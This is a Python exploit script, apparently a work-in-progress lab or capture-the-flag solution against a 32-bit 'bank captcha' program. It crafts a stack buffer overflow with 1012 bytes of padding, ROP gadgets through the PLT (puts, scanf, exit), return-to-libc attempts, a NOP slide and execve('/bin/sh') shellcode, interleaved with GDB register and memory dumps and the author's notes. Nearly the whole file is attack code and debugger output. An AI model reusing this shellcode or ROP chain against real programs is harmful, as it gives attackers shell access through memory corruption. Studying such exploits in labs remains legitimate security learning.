#!/usr/bin/python3
import struct
import sys

# 0x565555d0 <main+99>      lea    esp,[ebp-0x8]    ; esp = ebp-8, set esp to ebp-8                                   
# 0x565555d3 <main+102>     pop    ecx              ; ecx = value at top of stack ($esp)
# 0x565555d4 <main+103>     pop    ebx              ; pop another stack value
# 0x565555d6 <main+105>     lea    esp,[ecx-0x4]    ; esp  = ecx-4, set esp to ecx-4
# 0x565555d9 <main+108>     ret                     ; pop value at top of stack ($esp) and return

# padding0 = "AAAAB".encode() + b'\xef\xbe\xad\xde'

# padding = "AAAAB".encode()
# offset = 40 # add an offset that will hopefully hit the nopslide
# eip  = struct.pack("I", 0xffffdd90 + offset) * 10
nopslide = b'\x90'*200
# code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
# code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x1b\xcd\x80\x31\xc0\x40\xcd\x80'

# b0 ff = mov al, 0xFF
# 2c f4 = sub al, 0xF4
addSub = b'\xb0\xff\x2c\xf4'
code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2' + addSub + b'\xcd\x80\x31\xc0\x40\xcd\x80'

# payload = padding + eip + nopslide + code
# payload = padding0

# payload = ("1 "+"A"*2000).encode()
deadbeef = b'\xef\xbe\xad\xde'
deadbeef = struct.pack("I", 0x08049030) # 0x08049030  setbuf@plt
# 0x08049040 printf@plt
# 0xffffdd70 stack return address 
# 0xf7e975b0 execve
# 0x080494e3 : mov eax, dword ptr [esp] ; ret
# 0x08049050  puts@plt
offset = 0
desiredAddress = struct.pack("I", 0xf7e935b0 + offset)   # ebx + 4

# $ grep -R -a -b -o /bin/sh /lib/i386-linux-gnu/libc.so.6
# 1564879:/bin/sh

# binsh: x/s 0xf7f560cf      0xf7f560cf:	"/bin/sh"
#            0xf7f280cf
#            0xf7f520cf
binsh = struct.pack("I", 0xf7f520cf)
# binsh = struct.pack("I", 1564879 + 0xf7d06000)
# payload = b'1 ' + b'A'*1008 + deadbeef + desiredAddress + b'AAAA' + binsh + b'\x00'*8
# payload = b'1 ' + b'A'*1012 + deadbeef + desiredAddress + b'helloworld' # + nopslide + code
#payload = b'1 ' + desiredAddress*255 + nopslide + code
# payload = desiredAddress*255 + nopslide + code
# for letter in "abcdefghijklmnopqrstuvwxyz":
#     payload += letter.upper().encode() * 100
#print(payload)
# sys.stdout.buffer.write(payload)



# >>> info breakpoints
# Num     Type           Disp Enb Address    What
# 1       breakpoint     keep y   0x08049276 

# https://security.stackexchange.com/questions/149035/is-aslr-useless-in-preventing-attacks-such-as-return-to-libc-in-linux
# Is ASLR useless in preventing attacks such as return-to-libc in linux?
# When PIE is not used, the program must rely on a fixed PLT, created during linking, to resolve the addresses of functions in shared libraries.

# 0x08049050  puts@plt
# https://sidsbits.com/Defeating-ASLR-with-a-Leak/#Defeating-ASLR-with-a-Leak
# buf += p64(e.plt['puts']) # Return address - call the puts function
# buf += p64(e.got['puts']) # Argument to puts - GOT['puts']

# 0x08049050  puts@plt
eaxGadget = struct.pack("I", 0x080494e3)
putsPlt = struct.pack("I", 0x08049050)

# puts("Current balance: $500\n");
# Current balance: $500
# => 0x804945c:	add    esp,0x10 <== this address is right after "Current balance"

# Breakpoint 5, 0x08049040 in printf@plt ()
# >>> x/10i 0x08049208
#    0x804921c:	call   0x8049080 <__isoc99_scanf@plt> <== scanf address

# 0x08049060  exit@plt <======== EXIT address
# 0x08049208 <=== address after bank captcha
# 0x08049080  __isoc99_scanf@plt <============== scanf
# 0x08049540 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
returnAddress = struct.pack("I", 0x08049060)

# payload = b'1 ' + deadbeef*254 + eaxGadget + putsPlt + returnAddress
payload = b'1 ' + b'A'*1012 + deadbeef + eaxGadget + putsPlt + returnAddress
#                                        ^ at first ret go to the eaxGadget bc $eax is the pointer for puts
#                                                    ^ at eaxGadget, move in top of stack, which is the putsAddress. then ret to putsAddress :D
#                                                      puts will print whatever $eax is pointing to, which is puts itself? but its not. It's the stack?
#                                                              ^ from puts, ret to whatever :D


# 0x08049070  __libc_start_main@plt
# 0x08049540 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x0804921c:	call   0x8049080 <__isoc99_scanf@plt> <== scanf address
returnAddress = struct.pack("I", 0x8049080)
payload = b'1 ' + b'A'*1012 + deadbeef + returnAddress

# $eax needs to point to the string that will go into puts
# rop gadget: 0x080494e3 : mov eax, dword ptr [esp] ; ret
# Program received signal SIGSEGV, Segmentation fault.
# => 0xf7e711d1:	mov    ecx, DWORD PTR [eax]


# Scanf
# Captcha: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
# 0xffdc225c:	0x08049221	0x0804a0f7	0xffdc2284	0x00000002
# 0xffdc226c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
# 0xffdc227c:	0x62547333	0x004b6e41	0xffdc2280	0xf7f70289
# 0xffdc228c:	0x000000d5	0xf7d6acb8	0x677f9a5f	0xf7f61110

# eax 0x0804a0f7      ecx 0x00000009      edx 0xf7f42890      ebx 0x0804c000      
# esp 0xffdc225c      ebp 0xffdc2678      esi 0xf7f41000      edi 0x00000000      eip 0x08049080      eflags [ AF SF IF ] 
# cs 0x00000023       ss 0x0000002b       ds 0x0000002b       es 0x0000002b       fs 0x00000000       gs 0x00000063

# >>> x/ $eax
# 0x804a0f7:	"%s"
# >>> x/wx $eax
# 0x804a0f7:	0x43007325 = C null s %

# Check if %s is always at address: 0x804a0f7
# Yes it is.

# >>> x/50i $eip
# => 0x8049208:	add    esp,0x10
#    0x804920b:	sub    esp,0x8
#    0x804920e:	lea    eax,[ebp-0x3f4]   <==== 0x3f4 = 1012; 0xffa4bf94   <----------. this is where the result string is stored
#    0x8049214:	push   eax                                                           |
#    0x8049215:	lea    eax,[ebx-0x1f09]  <==== x/s $ebx-0x1f09 >>> 0x804a0f7: "%s"   |
#    0x804921b:	push   eax                                                           |
#    0x804921c:	call   0x8049080 <__isoc99_scanf@plt>                                |
# >>> x/s 0xffa4bf94                                                                 |
# 0xffa4bf94:	'A' <repeats 200 times>...   ----------------------------------------' same address

# stack:
# => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
# 0xffb9d6cc:	0x08049221	0x0804a0f7	0xffb9d6f4	0x00000002
#               |           |           ^ address of the result/ scanned string
#               |           ^ format string "%s"
#               ^ this is just the RETURN address for scanf
# 0xffbf71fc:	0x080491c1	0x00010001	0x00381ea0	0x62808426
# 0x08049060  exit@plt <======== EXIT address
returnAddress = struct.pack("I", 0x0804c000)
formatStringPointer = struct.pack("I", 0x0804a0f7)
addressToWritePayload = struct.pack("I", 0x0804c000)
payload += returnAddress + formatStringPointer + addressToWritePayload
payload += b' ' + nopslide + code

# unknownVars = [0xffb9d6f4, 0x00000002, 0x080491c1, 0x00010001, 0x00381ea0, 0x62808426]
# for u in unknownVars:
#     payload += struct.pack("I", u)

# >>> x/s 0x0804a0f7
# 0x804a0f7:	"%s" format string

# 0x08049221 is the userCaptcha buffer (maybe), where to write the buffer
# STOPPED HERE: thoughts:
# POSSIBLE TO WRITE ANYWHERE?? Write the payload to a known address then execute it!

sys.stdout.buffer.write(payload)